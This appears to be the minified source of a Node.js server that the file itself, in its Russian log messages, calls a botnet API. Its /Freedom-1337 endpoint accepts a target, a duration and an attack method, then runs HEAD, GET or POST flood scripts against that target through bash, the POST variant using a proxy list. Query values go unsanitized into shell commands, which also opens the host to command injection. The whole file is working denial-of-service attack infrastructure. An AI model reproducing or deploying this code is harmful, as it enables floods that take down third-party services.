const e = require("express");const{exec:r}=require("child_process");const a=require("axios");const s=require("os");const t=e();t.use(e.json());const p=process.env.PORT||process.env.SERVER_PORT||5032;

async function g(){try{const e=(await a.get("https://api64.ipify.org?format=json")).data.ip;const t=Object.values(s.networkInterfaces()).flat().find(e=>e.family==="IPv4"&&!e.internal)?.address||"НЕИЗВЕСТНО";console.log(`✅ API ботнета готов!`);console.log(`🌍 ПУБЛИЧНЫЙ  : http://${e}:${p}/Freedom-1337`);console.log(`🏠 ЛОКАЛЬНЫЙ : http://${t}:${p}/Freedom-1337`);return{publicIP:e,privateIP:t}}catch(e){console.error("❌ ОШИБКА ПОЛУЧЕНИЯ IP:",e);return{publicIP:"НЕИЗВЕСТНО",privateIP:"НЕИЗВЕСТНО"}}}

function c(e){console.log(`⚡ Выполнение команды: ${e}`);r(e,{shell:"/bin/bash"},(e,t,n)=>{if(e){console.error(`❌ ОШИБКА: ${n}`);return}console.log(`РЕЗУЛЬТАТ:\n${t}`)})}

t.get("/Freedom-1337",(e,r)=>{const{target:a,time:s,methods:t}=e.query;if(!a||!s||!t)return r.status(400).json({status:"ошибка",message:"Отсутствуют параметры!"});r.status(200).json({status:"успех",message:"Атака выполняется...",target:a,time:s,methods:t});const p={head:`node zblyatovsch/head.js ${a} ${s}`,strike:`node zblyatovsch/get.js ${a} ${s}`,post:`node zblyatovsch/post.js ${a} ${s} 100 10 proxy.txt`};p[t]?c(p[t]):console.log("❌ Неизвестный метод!")});

t.get("/Freedom1337/status",async(e,r)=>{const{publicIP:a,privateIP:s}=await g();r.json({status:"в сети",uptime:process.uptime(),ip_public:a,ip_private:s,port:p})});

t.listen(p,"0.0.0.0",async()=>{await g();console.log(`🚀 Сервер запущен на порту ${p}`)});
